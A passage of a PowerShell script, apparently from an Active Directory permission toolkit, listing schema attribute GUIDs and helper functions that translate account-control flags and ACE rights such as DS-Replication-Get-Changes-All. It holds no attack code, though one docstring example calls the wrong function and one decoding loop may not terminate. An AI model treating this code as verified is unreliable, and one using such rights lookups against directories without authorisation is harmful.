        "rpcContainer" = "80212842-4bdc-11d1-a9c4-0000f80367c1";
        "rpcEntry" = "bf967aac-0de6-11d0-a285-00aa003049e2";
        "rpcGroup" = "88611bdf-8cf4-11d0-afda-00c04fd930c9";
        "rpcNsAnnotation" = "88611bde-8cf4-11d0-afda-00c04fd930c9";
        "rpcNsBindings" = "bf967a23-0de6-11d0-a285-00aa003049e2";
        "rpcNsCodeset" = "7a0ba0e0-8e98-11d0-afda-00c04fd930c9";
        "rpcNsEntryFlags" = "80212841-4bdc-11d1-a9c4-0000f80367c1";
        "rpcNsGroup" = "bf967a24-0de6-11d0-a285-00aa003049e2";
        "rpcNsInterfaceID" = "bf967a25-0de6-11d0-a285-00aa003049e2";
        "rpcNsObjectID" = "29401c48-7a27-11d0-afd6-00c04fd930c9";
        "rpcNsPriority" = "bf967a27-0de6-11d0-a285-00aa003049e2";
        "rpcNsProfileEntry" = "bf967a28-0de6-11d0-a285-00aa003049e2";
        "rpcNsTransferSyntax" = "29401c4a-7a27-11d0-afd6-00c04fd930c9";
        "rpcProfile" = "88611be1-8cf4-11d0-afda-00c04fd930c9";
        "rpcProfileElement" = "f29653cf-7ad0-11d0-afd6-00c04fd930c9";
        "rpcServer" = "88611be0-8cf4-11d0-afda-00c04fd930c9";
        "rpcServerElement" = "f29653d0-7ad0-11d0-afd6-00c04fd930c9";
        "rRASAdministrationConnectionPoint" = "2a39c5be-8960-11d1-aebc-0000f80367c1";
        "rRASAdministrationDictionary" = "f39b98ae-938d-11d1-aebd-0000f80367c1";
        "rTSCheckpointSize" = "a8df7468-c5ea-11d1-bbcb-0080c76670c0";
        "rTSRecoveryTimeout" = "a8df7469-c5ea-11d1-bbcb-0080c76670c0";
        "rTSWindowSize" = "a8df746a-c5ea-11d1-bbcb-0080c76670c0";
        "runsOn" = "a8df746b-c5ea-11d1-bbcb-0080c76670c0";
        "sAMAccountName" = "3e0abfd0-126a-11d0-a060-00aa006c33ed";
        "sAMAccountType" = "6e7b626c-64f2-11d0-afd2-00c04fd930c9";
        "samDomain" = "bf967a90-0de6-11d0-a285-00aa003049e2";
        "samDomainBase" = "bf967a91-0de6-11d0-a285-00aa003049e2";
        "samDomainUpdates" = "04d2d114-f799-4e9b-bcdc-90e8f5ba7ebe";
        "samServer" = "bf967aad-0de6-11d0-a285-00aa003049e2";
        "schedule" = "dd712224-10e4-11d0-a05f-00aa006c33ed";
        "schemaFlagsEx" = "bf967a2b-0de6-11d0-a285-00aa003049e2";
        "schemaIDGUID" = "bf967923-0de6-11d0-a285-00aa003049e2";
        "schemaInfo" = "f9fb64ae-93b4-11d2-9945-0000f87a57d4";
        "schemaUpdate" = "1e2d06b4-ac8f-11d0-afe3-00c04fd930c9";
        "schemaVersion" = "bf967a2c-0de6-11d0-a285-00aa003049e2";
        "scopeFlags" = "16f3a4c2-7e79-11d2-9921-0000f87a57d4";
        "scriptPath" = "bf9679a8-0de6-11d0-a285-00aa003049e2";
        "sDRightsEffective" = "c3dbafa6-33df-11d2-98b2-0000f87a57d4";
        "searchFlags" = "bf967a2d-0de6-11d0-a285-00aa003049e2";
        "searchGuide" = "bf967a2e-0de6-11d0-a285-00aa003049e2";
        "secret" = "bf967aae-0de6-11d0-a285-00aa003049e2";
        "secretary" = "01072d9a-98ad-4a53-9744-e83e287278fb";
        "securityIdentifier" = "bf967a2f-0de6-11d0-a285-00aa003049e2";
        "securityObject" = "bf967aaf-0de6-11d0-a285-00aa003049e2";
        "securityPolicy" = "1677587b-47f3-11d1-a9c3-0000f80367c1";
        "securityPrincipal" = "bf967ab0-0de6-11d0-a285-00aa003049e2";
        "securityProtocol" = "bf967a30-0de6-11d0-a285-00aa003049e2";
        "seeAlso" = "bf967a31-0de6-11d0-a285-00aa003049e2";
        "sendEMailMessage" = "a8df746e-c5ea-11d1-bbcb-0080c76670c0";
        "sendTNEF" = "a8df746f-c5ea-11d1-bbcb-0080c76670c0";
        "seqNotification" = "ddac0cf2-af8f-11d0-afeb-00c04fd930c9";
        "serialNumber" = "bf967a32-0de6-11d0-a285-00aa003049e2";
        "server" = "bf967a92-0de6-11d0-a285-00aa003049e2";
        "serverName" = "09dcb7a0-165f-11d0-a064-00aa006c33ed";
        "serverReference" = "26d9736d-6070-11d1-a9c6-0000f80367c1";
        "serverReferenceBL" = "26d9736e-6070-11d1-a9c6-0000f80367c1";
        "serverRole" = "bf967a33-0de6-11d0-a285-00aa003049e2";
        "serversContainer" = "f780acc0-56f0-11d1-a9c6-0000f80367c1";
        "serverState" = "bf967a34-0de6-11d0-a285-00aa003049e2";
        "serviceActionFirst" = "a8df7470-c5ea-11d1-bbcb-0080c76670c0";
        "serviceActionOther" = "a8df7471-c5ea-11d1-bbcb-0080c76670c0";
        "serviceActionSecond" = "a8df7472-c5ea-11d1-bbcb-0080c76670c0";
        "serviceAdministrationPoint" = "b7b13123-b82e-11d0-afee-0000f80367c1";
        "serviceBindingInformation" = "b7b1311c-b82e-11d0-afee-0000f80367c1";
        "serviceClass" = "bf967ab1-0de6-11d0-a285-00aa003049e2";
        "serviceClassID" = "bf967a35-0de6-11d0-a285-00aa003049e2";
        "serviceClassInfo" = "bf967a36-0de6-11d0-a285-00aa003049e2";
        "serviceClassName" = "b7b1311d-b82e-11d0-afee-0000f80367c1";
        "serviceConnectionPoint" = "28630ec1-41d5-11d1-a9c1-0000f80367c1";
        "serviceDNSName" = "28630eb8-41d5-11d1-a9c1-0000f80367c1";
        "serviceDNSNameType" = "28630eba-41d5-11d1-a9c1-0000f80367c1";
        "serviceInstance" = "bf967ab2-0de6-11d0-a285-00aa003049e2";
        "serviceInstanceVersion" = "bf967a37-0de6-11d0-a285-00aa003049e2";
        "servicePrincipalName" = "f3a64788-5306-11d1-a9c5-0000f80367c1";
        "serviceRestartDelay" = "a8df7473-c5ea-11d1-bbcb-0080c76670c0";
        "serviceRestartMessage" = "a8df7474-c5ea-11d1-bbcb-0080c76670c0";
        "sessionDisconnectTimer" = "a8df7475-c5ea-11d1-bbcb-0080c76670c0";
        "setupCommand" = "7d6c0e97-7e20-11d0-afd6-00c04fd930c9";
        "shadowAccount" = "5b6d8467-1a18-4174-b350-9cc6e7b4ac8d";
        "shadowExpire" = "75159a00-1fff-4cf4-8bff-4ef2695cf643";
        "shadowFlag" = "8dfeb70d-c5db-46b6-b15e-a4389e6cee9b";
        "shadowInactive" = "86871d1f-3310-4312-8efd-af49dcfb2671";
        "shadowLastChange" = "f8f2689c-29e8-4843-8177-e8b98e15eeac";
        "shadowMax" = "f285c952-50dd-449e-9160-3b880d99988d";
        "shadowMin" = "a76b8737-e5a1-4568-b057-dc12e04be4b2";
        "shadowWarning" = "7ae89c9c-2976-4a46-bb8a-340f88560117";
        "shellContextMenu" = "553fd039-f32e-11d0-b0bc-00c04fd8dca6";
        "shellPropertyPages" = "52458039-ca6a-11d0-afff-0000f80367c1";
        "shortServerName" = "45b01501-c419-11d1-bbc9-0080c76670c0";
        "showInAddressBook" = "3e74f60e-3e73-11d1-a9c0-0000f80367c1";
        "showInAdvancedViewOnly" = "bf967984-0de6-11d0-a285-00aa003049e2";
        "sIDHistory" = "17eb4278-d167-11d0-b002-0000f80367c1";
        "signatureAlgorithms" = "2a39c5b2-8960-11d1-aebc-0000f80367c1";
        "simpleSecurityObject" = "5fe69b0b-e146-4f15-b0ab-c1e5d488e094";
        "site" = "bf967ab3-0de6-11d0-a285-00aa003049e2";
        "siteAddressing" = "a8df74d9-c5ea-11d1-bbcb-0080c76670c0";
        "siteConnector" = "a8df74da-c5ea-11d1-bbcb-0080c76670c0";
        "siteFolderGUID" = "a8df7477-c5ea-11d1-bbcb-0080c76670c0";
        "siteFolderServer" = "a8df7478-c5ea-11d1-bbcb-0080c76670c0";
        "siteGUID" = "3e978924-8c01-11d0-afda-00c04fd930c9";
        "siteLink" = "d50c2cde-8951-11d1-aebc-0000f80367c1";
        "siteLinkBridge" = "d50c2cdf-8951-11d1-aebc-0000f80367c1";
        "siteLinkList" = "d50c2cdd-8951-11d1-aebc-0000f80367c1";
        "siteList" = "d50c2cdc-8951-11d1-aebc-0000f80367c1";
        "siteObject" = "3e10944c-c354-11d0-aff8-0000f80367c1";
        "siteObjectBL" = "3e10944d-c354-11d0-aff8-0000f80367c1";
        "siteProxySpace" = "a8df7479-c5ea-11d1-bbcb-0080c76670c0";
        "sitesContainer" = "7a4117da-cd67-11d0-afff-0000f80367c1";
        "siteServer" = "1be8f17c-a9ff-11d0-afe2-00c04fd930c9";
        "sMIMEAlgListNA" = "a8df747a-c5ea-11d1-bbcb-0080c76670c0";
        "sMIMEAlgListOther" = "a8df747b-c5ea-11d1-bbcb-0080c76670c0";
        "sMIMEAlgSelectedNA" = "a8df747c-c5ea-11d1-bbcb-0080c76670c0";
        "sMIMEAlgSelectedOther" = "a8df747d-c5ea-11d1-bbcb-0080c76670c0";
        "sn" = "bf967a41-0de6-11d0-a285-00aa003049e2";
        "spaceLastComputed" = "9928d7bc-b093-11d2-aa06-00c04f8eedd8";
        "sPNMappings" = "2ab0e76c-7041-11d2-9905-0000f87a57d4";
        "sSelector" = "a8df746c-c5ea-11d1-bbcb-0080c76670c0";
        "sSelectorInbound" = "a8df746d-c5ea-11d1-bbcb-0080c76670c0";
        "st" = "bf967a39-0de6-11d0-a285-00aa003049e2";
        "storage" = "bf967ab5-0de6-11d0-a285-00aa003049e2";
        "street" = "bf967a3a-0de6-11d0-a285-00aa003049e2";
        "streetAddress" = "f0f8ff84-1191-11d0-a060-00aa006c33ed";
        "structuralObjectClass" = "3860949f-f6a8-4b38-9950-81ecb6bc2982";
        "subClassOf" = "bf967a3b-0de6-11d0-a285-00aa003049e2";
        "submissionContLength" = "bf967a3e-0de6-11d0-a285-00aa003049e2";
        "subnet" = "b7b13124-b82e-11d0-afee-0000f80367c1";
        "subnetContainer" = "b7b13125-b82e-11d0-afee-0000f80367c1";
        "subRefs" = "bf967a3c-0de6-11d0-a285-00aa003049e2";
        "subSchema" = "5a8b3261-c38d-11d1-bbc9-0080c76670c0";
        "subSchemaSubEntry" = "9a7ad94d-ca53-11d1-bbd0-0080c76670c0";
        "superiorDNSRoot" = "5245801d-ca6a-11d0-afff-0000f80367c1";
        "superScopeDescription" = "963d274c-48be-11d1-a9c3-0000f80367c1";
        "superScopes" = "963d274b-48be-11d1-a9c3-0000f80367c1";
        "supplementalCredentials" = "bf967a3f-0de6-11d0-a285-00aa003049e2";
        "supportedAlgorithms" = "1677588e-47f3-11d1-a9c3-0000f80367c1";
        "supportedApplicationContext" = "1677588f-47f3-11d1-a9c3-0000f80367c1";
        "supportingStack" = "a8df7480-c5ea-11d1-bbcb-0080c76670c0";
        "supportingStackBL" = "16775891-47f3-11d1-a9c3-0000f80367c1";
        "supportSMIMESignatures" = "a8df747f-c5ea-11d1-bbcb-0080c76670c0";
        "syncAttributes" = "037651e4-441d-11d1-a9c3-0000f80367c1";
        "syncMembership" = "037651e3-441d-11d1-a9c3-0000f80367c1";
        "syncWithObject" = "037651e2-441d-11d1-a9c3-0000f80367c1";
        "syncWithSID" = "037651e5-441d-11d1-a9c3-0000f80367c1";
        "systemAuxiliaryClass" = "bf967a43-0de6-11d0-a285-00aa003049e2";
        "systemFlags" = "e0fa1e62-9b45-11d0-afdd-00c04fd930c9";
        "systemMayContain" = "bf967a44-0de6-11d0-a285-00aa003049e2";
        "systemMustContain" = "bf967a45-0de6-11d0-a285-00aa003049e2";
        "systemOnly" = "bf967a46-0de6-11d0-a285-00aa003049e2";
        "systemPossSuperiors" = "bf967a47-0de6-11d0-a285-00aa003049e2";
        "targetAddress" = "f0f8ff9f-1191-11d0-a060-00aa006c33ed";
        "targetMTAs" = "a8df7483-c5ea-11d1-bbcb-0080c76670c0";
        "telephoneAssistant" = "a8df7484-c5ea-11d1-bbcb-0080c76670c0";
        "telephoneNumber" = "bf967a49-0de6-11d0-a285-00aa003049e2";
        "teletexTerminalIdentifier" = "bf967a4a-0de6-11d0-a285-00aa003049e2";
        "telexNumber" = "bf967a4b-0de6-11d0-a285-00aa003049e2";
        "tempAssocThreshold" = "a8df7488-c5ea-11d1-bbcb-0080c76670c0";
        "templateRoots" = "ed9de9a0-7041-11d2-9905-0000f87a57d4";
        "templateRoots2" = "b1cba91a-0682-4362-a659-153e201ef069";
        "terminalServer" = "6db69a1c-9422-11d1-aebd-0000f80367c1";
        "textEncodedORAddress" = "a8df7489-c5ea-11d1-bbcb-0080c76670c0";
        "thumbnailLogo" = "bf9679a9-0de6-11d0-a285-00aa003049e2";
        "thumbnailPhoto" = "8d3bca50-1d7e-11d0-a081-00aa006c33ed";
        "timeRefresh" = "ddac0cf1-af8f-11d0-afeb-00c04fd930c9";
        "timeVolChange" = "ddac0cf0-af8f-11d0-afeb-00c04fd930c9";
        "title" = "bf967a55-0de6-11d0-a285-00aa003049e2";
        "tokenGroups" = "b7c69e6d-2cc7-11d2-854e-00a0c983f608";
        "tokenGroupsGlobalAndUniversal" = "46a9b11d-60ae-405a-b7e8-ff8a58d456d2";
        "tokenGroupsNoGCAcceptable" = "040fc392-33df-11d2-98b2-0000f87a57d4";
        "tombstoneLifetime" = "16c3a860-1273-11d0-a060-00aa006c33ed";
        "top" = "bf967ab7-0de6-11d0-a285-00aa003049e2";
        "tP4Stack" = "a8df74db-c5ea-11d1-bbcb-0080c76670c0";
        "tP4X400Link" = "a8df74dc-c5ea-11d1-bbcb-0080c76670c0";
        "trackingLogPathName" = "bf967a57-0de6-11d0-a285-00aa003049e2";
        "transferRetryInterval" = "a8df748c-c5ea-11d1-bbcb-0080c76670c0";
        "transferTimeoutNonUrgent" = "a8df748d-c5ea-11d1-bbcb-0080c76670c0";
        "transferTimeoutNormal" = "a8df748e-c5ea-11d1-bbcb-0080c76670c0";
        "transferTimeoutUrgent" = "a8df748f-c5ea-11d1-bbcb-0080c76670c0";
        "translationTableUsed" = "a8df7490-c5ea-11d1-bbcb-0080c76670c0";
        "transportAddressAttribute" = "c1dc867c-a261-11d1-b606-0000f80367c1";
        "transportDLLName" = "26d97372-6070-11d1-a9c6-0000f80367c1";
        "transportExpeditedData" = "a8df7491-c5ea-11d1-bbcb-0080c76670c0";
        "transportStack" = "a8df74dd-c5ea-11d1-bbcb-0080c76670c0";
        "transportType" = "26d97374-6070-11d1-a9c6-0000f80367c1";
        "transRetryMins" = "a8df748a-c5ea-11d1-bbcb-0080c76670c0";
        "transTimeoutMins" = "a8df748b-c5ea-11d1-bbcb-0080c76670c0";
        "treatAsLeaf" = "8fd044e3-771f-11d1-aeae-0000f80367c1";
        "treeName" = "28630ebd-41d5-11d1-a9c1-0000f80367c1";
        "trustAttributes" = "80a67e5a-9f22-11d0-afdd-00c04fd930c9";
        "trustAuthIncoming" = "bf967a59-0de6-11d0-a285-00aa003049e2";
        "trustAuthOutgoing" = "bf967a5f-0de6-11d0-a285-00aa003049e2";
        "trustDirection" = "bf967a5c-0de6-11d0-a285-00aa003049e2";
        "trustedDomain" = "bf967ab8-0de6-11d0-a285-00aa003049e2";
        "trustLevel" = "a8df7492-c5ea-11d1-bbcb-0080c76670c0";
        "trustParent" = "b000ea7a-a086-11d0-afdd-00c04fd930c9";
        "trustPartner" = "bf967a5d-0de6-11d0-a285-00aa003049e2";
        "trustPosixOffset" = "bf967a5e-0de6-11d0-a285-00aa003049e2";
        "trustType" = "bf967a60-0de6-11d0-a285-00aa003049e2";
        "tSelector" = "a8df7481-c5ea-11d1-bbcb-0080c76670c0";
        "turnRequestThreshold" = "a8df7493-c5ea-11d1-bbcb-0080c76670c0";
        "twoWayAlternateFacility" = "a8df7494-c5ea-11d1-bbcb-0080c76670c0";
        "type" = "167758aa-47f3-11d1-a9c3-0000f80367c1";
        "typeLibrary" = "281416e2-1968-11d0-a28f-00aa003049e2";
        "uASCompat" = "bf967a61-0de6-11d0-a285-00aa003049e2";
        "uid" = "0bb0fca0-1e89-429f-901a-1413894d9f59";
        "uidNumber" = "850fcc8f-9c6b-47e1-b671-7c654be4d5b3";
        "unauthOrig" = "a8df7495-c5ea-11d1-bbcb-0080c76670c0";
        "unauthOrigBL" = "a8df7496-c5ea-11d1-bbcb-0080c76670c0";
        "uNCName" = "bf967a64-0de6-11d0-a285-00aa003049e2";
        "unicodePwd" = "bf9679e1-0de6-11d0-a285-00aa003049e2";
        "uniqueIdentifier" = "ba0184c7-38c5-4bed-a526-75421470580c";
        "uniqueMember" = "8f888726-f80a-44d7-b1ee-cb9df21392c8";
        "unixHomeDirectory" = "bc2dba12-000f-464d-bf1d-0808465d8843";
        "unixUserPassword" = "612cb747-c0e8-4f92-9221-fdd5f15b550d";
        "unmergedAtts" = "9947d64e-b093-11d2-aa06-00c04f8eedd8";
        "unstructuredAddress" = "50950839-cc4c-4491-863a-fcf942d684b7";
        "unstructuredName" = "9c8ef177-41cf-45c9-9673-7716c0c8901b";
        "upgradeProductCode" = "d9e18312-8939-11d1-aebc-0000f80367c1";
        "uPNSuffixes" = "032160bf-9824-11d1-aec0-0000f80367c1";
        "url" = "9a9a0221-4a5b-11d1-a9c3-0000f80367c1";
        "usenetSiteName" = "f0f8ffa8-1191-11d0-a060-00aa006c33ed";
        "user" = "bf967aba-0de6-11d0-a285-00aa003049e2";
        "userAccountControl" = "bf967a68-0de6-11d0-a285-00aa003049e2";
        "userCert" = "bf967a69-0de6-11d0-a285-00aa003049e2";
        "userCertificate" = "bf967a7f-0de6-11d0-a285-00aa003049e2";
        "userClass" = "11732a8a-e14d-4cc5-b92f-d93f51c6d8e4";
        "userParameters" = "bf967a6d-0de6-11d0-a285-00aa003049e2";
        "userPassword" = "bf967a6e-0de6-11d0-a285-00aa003049e2";
        "userPKCS12" = "23998ab5-70f8-4007-a4c1-a84a38311f9a";
        "userPrincipalName" = "28630ebb-41d5-11d1-a9c1-0000f80367c1";
        "userSharedFolder" = "9a9a021f-4a5b-11d1-a9c3-0000f80367c1";
        "userSharedFolderOther" = "9a9a0220-4a5b-11d1-a9c3-0000f80367c1";
        "userSMIMECertificate" = "e16a9db2-403c-11d1-a9c0-0000f80367c1";
        "userWorkstations" = "bf9679d7-0de6-11d0-a285-00aa003049e2";
        "useSiteValues" = "a8df7497-c5ea-11d1-bbcb-0080c76670c0";
        "uSNChanged" = "bf967a6f-0de6-11d0-a285-00aa003049e2";
        "uSNCreated" = "bf967a70-0de6-11d0-a285-00aa003049e2";
        "uSNDSALastObjRemoved" = "bf967a71-0de6-11d0-a285-00aa003049e2";
        "USNIntersite" = "a8df7498-c5ea-11d1-bbcb-0080c76670c0";
        "uSNLastObjRem" = "bf967a73-0de6-11d0-a285-00aa003049e2";
        "uSNSource" = "167758ad-47f3-11d1-a9c3-0000f80367c1";
        "validAccesses" = "4d2fa380-7f54-11d2-992a-0000f87a57d4";
        "vendor" = "281416df-1968-11d0-a28f-00aa003049e2";
        "versionNumber" = "bf967a76-0de6-11d0-a285-00aa003049e2";
        "versionNumberHi" = "7d6c0e9a-7e20-11d0-afd6-00c04fd930c9";
        "versionNumberLo" = "7d6c0e9b-7e20-11d0-afd6-00c04fd930c9";
        "volTableGUID" = "1f0075fd-7e40-11d0-afd6-00c04fd930c9";
        "volTableIdxGUID" = "1f0075fb-7e40-11d0-afd6-00c04fd930c9";
        "volume" = "bf967abb-0de6-11d0-a285-00aa003049e2";
        "volumeCount" = "34aaa217-b699-11d0-afee-0000f80367c1";
        "wbemPath" = "244b2970-5abd-11d0-afd2-00c04fd930c9";
        "wellKnownObjects" = "05308983-7688-11d1-aded-00c04fd8d5cd";
        "whenChanged" = "bf967a77-0de6-11d0-a285-00aa003049e2";
        "whenCreated" = "bf967a78-0de6-11d0-a285-00aa003049e2";
        "winsockAddresses" = "bf967a79-0de6-11d0-a285-00aa003049e2";
        "wWWHomePage" = "bf967a7a-0de6-11d0-a285-00aa003049e2";
        "x25CallUserDataIncoming" = "a8df749b-c5ea-11d1-bbcb-0080c76670c0";
        "x25CallUserDataOutgoing" = "a8df749c-c5ea-11d1-bbcb-0080c76670c0";
        "x25FacilitiesDataIncoming" = "a8df749d-c5ea-11d1-bbcb-0080c76670c0";
        "x25FacilitiesDataOutgoing" = "a8df749e-c5ea-11d1-bbcb-0080c76670c0";
        "x25LeasedLinePort" = "a8df749f-c5ea-11d1-bbcb-0080c76670c0";
        "x25LeasedOrSwitched" = "a8df74a0-c5ea-11d1-bbcb-0080c76670c0";
        "x25RemoteMTAPhone" = "a8df74a1-c5ea-11d1-bbcb-0080c76670c0";
        "x25Stack" = "a8df74de-c5ea-11d1-bbcb-0080c76670c0";
        "x25X400Link" = "a8df74df-c5ea-11d1-bbcb-0080c76670c0";
        "x121Address" = "bf967a7b-0de6-11d0-a285-00aa003049e2";
        "x400AttachmentType" = "a8df74a2-c5ea-11d1-bbcb-0080c76670c0";
        "x400Link" = "a8df74e0-c5ea-11d1-bbcb-0080c76670c0";
        "x400SelectorSyntax" = "a8df74a3-c5ea-11d1-bbcb-0080c76670c0";
        "x500RDN" = "bf967a7d-0de6-11d0-a285-00aa003049e2";
        "x500uniqueIdentifier" = "d07da11f-8a3d-42b6-b0aa-76c962be719a";
        "xMITTimeoutNonUrgent" = "a8df74a4-c5ea-11d1-bbcb-0080c76670c0";
        "xMITTimeoutNormal" = "a8df74a5-c5ea-11d1-bbcb-0080c76670c0";
        "xMITTimeoutUrgent" = "1482fed4-b098-11d2-aa06-00c04f8eedd8";
    }
}


function _Helper-GetValueOfUACFlags {
    
    <#

        .SYNOPSIS

            Returns the Value associated with the specified UAC Flag(s) (comma-separated, if multiple).
        
        .PARAMETER UACFlags

            [System.String] 
            
            The UAC Flag(s) (comma-separated, if multiple).

        .EXAMPLE

            _Helper-GetValueOfUACFlags -UACFlags 'DONT_REQ_PREAUTH'

            Returns 4194304 (0x400000)

        .EXAMPLE

            _Helper-GetValueOfUACFlags -UACFlags 'ACCOUNTDISABLE,LOCKOUT'

            Returns 18 (2+16)

        .OUTPUTS

            [System.Int32] 
            
            The Value of the specified UAC Flag(s) (additive if multiple).

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries (ACEs)

        .LINK

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties (UAC Flags)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the UAC Flag(s) (comma-separated, if multiple) to translate into an additionned value")]
        [System.String]$UACFlags
    )

    #Write-Verbose "[*] Retrieving Value Associated With UAC Flag(s) '$UACFlags'..."

    $UACs = _Helper-GetUACFlagsArray

    $Sum = 0;
    $UACFlags = $UACFlags -replace ' ', ''
    $UACs.GetEnumerator() | Where-Object { 
        @($UACFlags -split ',' | ForEach-Object { $_.Trim().ToUpper() }) -contains $_.Key.ToUpper()
    } | ForEach-Object { 
        $Sum += $_.Value 
    }

    if ($Sum -eq 0) {
        #Write-Verbose "[!] Couldn't Find Value Associated With UAC Flag(s) '$UACFlags' ! Returning 0..."
    } else {
        #Write-Verbose "[+] Successfully Retrieved Value $Sum Associated With UAC Flag(s) '$UACFlags' !"
    }

    return $Sum;
}


function _Helper-GetUACFlagsOfValue {
    
    <#

        .SYNOPSIS

            Returns the UAC Flag(s) (comma-separated, if multiple) associated with the specified UAC Value.
        
        .PARAMETER UACValue

            [System.Int32] 
            
            The UAC Value

        .EXAMPLE

            _Helper-GetUACFlagsOfValue -UACValue 4194304

            Returns `DONT_REQ_PREAUTH`

        .EXAMPLE

            _Helper-GetValueOfUACFlags -UACFlags $(0x0002+0x0010)

            Returns `ACCOUNTDISABLE,LOCKOUT`

        .OUTPUTS

            [System.String] 
            
            The UAC Flag(s) (comma-separated, if multiple) associated with the specified UAC Value.

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries (ACEs)

        .LINK

            https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties (UAC Flags)

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the UAC Value to translate into UAC Flags (comma-separated, if multiple)")]
        [System.Int32]$UACValue
    )

    #Write-Verbose "[*] Retrieving UAC Flag(s) Associated With UAC Value '$UACValue'..."

    $UACs = _Helper-GetUACFlagsArray

    $Result = '';
    $UACs.GetEnumerator() | Sort-Object -Property Value |ForEach-Object {
        if (($_.Value -band $UACValue) -ne 0) {
            $Result += "$($_.Key),"
        }
    }

    if ($Result.Length -eq 0) {
        #Write-Verbose "[!] No UAC Flag Found ! Returning Empty String..."
    } else {
        # Removing extra comma
        $Result = $Result.Substring(0, $Result.Length - 1)
        #Write-Verbose "[+] Successfully Retrieved UAC Flag(s) '$Result' Associated With UAC Value $UACValue !"
    }

    return $Result;
}


function _Helper-GetValueOfACEAccessMaskNames {
    
    <#

        .SYNOPSIS

            Returns the Value associated with the specified ACE Access Mask Name(s) (comma-separated, if multiple).

        .PARAMETER AccessMaskNames

            [System.String] 
            
            The Access Mask Name(s) (comma-separated, if multiple) of the ACE.

        .EXAMPLE

            _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames 'GenericAll'

            Returns 983551

        .EXAMPLE

            _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames 'ReadProperty, WriteProperty'

            Returns 48 (16+32)

        .OUTPUTS

            [System.Int32] 
            
            The Value of the specified ACE Access Mask Name(s) (comma-separated, if multiple).

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE to translate into an additionned value (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
        [System.String]$AccessMaskNames
    )

    #Write-Verbose "[*] Retrieving Value Associated With ACE AccessMask Name '$AccessMaskNames'..."

    $AccessMasks = _Helper-GetAccessMasksArray

    $Sum = 0;
    $AccessMaskNames = $AccessMaskNames -replace ' ', ''
    $AccessMasks.GetEnumerator() | Where-Object { 
        @($AccessMaskNames -split ',' | ForEach-Object { $_.Trim().ToUpper() }) -contains $_.Key.ToUpper() 
    } | ForEach-Object { $Sum += $_.Value }
    
    if ($Sum -eq 0) {
        #Write-Verbose "[!] Couldn't Find Value Associated With Access Mask Name(s) '$AccessMaskNames' ! Returning 0..."
    } else {
        #Write-Verbose "[+] Successfully Retrieved Value $Sum Associated With Access Mask Name(s) '$AccessMaskNames' !"
    }

    return $Sum;
}


function _Helper-GetNamesOfACEAccessMaskValue {
    
    <#

        .SYNOPSIS

            Returns the Name(s) (comma-separated, if multiple) associated with the specified ACE Value.
        
        .PARAMETER AccessMaskValue

            [System.String] 
            
            The Access Mask Value (additioned, if multiple) of the ACE.

        .EXAMPLE

            _Helper-GetNamesOfACEAccessMaskValue -AccessMaskValue 983551

            Returns `GenericAll`

        .EXAMPLE

            _Helper-GetNamesOfACEAccessMaskValue -AccessMaskValue $(16+32)

            Returns `WriteProperty, ReadProperty`

        .OUTPUTS

            [System.String] 
            
            The Name(s) (comma-separated, if multiple) associated with the specified ACE Value.

            

        .LINK

            https://learn.microsoft.com/en-us/windows/win32/secauthz/access-control-entries

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the additionned Access Mask Value of the ACE to translate into Name(s) (will be comma-separated, if multiple)")]
        [System.Int32]$AccessMaskValue
    )

    #Write-Verbose "[*] Retrieving Name(s) Associated With ACE AccessMask Value '$AccessMaskValue'..."
    $AccessMasks = _Helper-GetAccessMasksArray

    $Sum = $AccessMaskValue;
    # Removing each Access Mask from the total value starting from the highest one
    while ($Sum -gt 0) {
        foreach ($key in $AccessMasks.Keys | Sort-Object { -$AccessMasks[$_] }) {
            if ($AccessMasks[$key] -le $Sum) {
                $Result += "$key, ";
                $Sum -= $AccessMasks[$key];
            }
        }
    }
    $Result = $Result.TrimEnd(', ');
    #Write-Verbose "[+] Successfully Retrieved '$Result' Name(s) Associated With ACE AccessMask Value '$AccessMaskValue' !"
    return $Result;
}


function _Helper-GetGUIDOfACEAccessRightName {
    
    <#

        .SYNOPSIS

            Returns the GUID associated with the specified ACE Access Right Name (i.e. ObjectAceType).

        .PARAMETER AccessRightName

            [System.String] 
            
            The Access Right Name (i.e. ObjectAceType) of the ACE.

        .EXAMPLE

            _Helper-GetGUIDOfACEAccessRightName -AccessRightName 'DS-Replication-Get-Changes-All'

            Returns `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`

        .EXAMPLE

            _Helper-GetGUIDOfACEAccessRightName -AccessRightName 'Public-Information'

            Returns `e48d0154-bcf8-11d1-8702-00c04fb96050`
            
        .EXAMPLE

            _Helper-GetGUIDOfACEAccessRightName -AccessRightName 'DS-ThereIsAbsolutelyNo42WayIMayExist_EVER!'

            Returns `[Guid]::Empty`

        .OUTPUTS

            [System.String] 
            
            The GUID associated with the specified ACE Access Right Name (i.e. ObjectAceType).

            - Returns an empty GUID (i.e. [Guid]::Empty) if not found, to deal with ACEs that doesn't have `ObjectAceType` attribute (e.g. `[AccessMask='GenericAll', ObjectAceType=NULL]`), hence being set to None.
            - You may see such ACE entries into `PrincipalTo*.txt`, where `ObjectAceType` is unset (i.e. set no None).

        .LINK

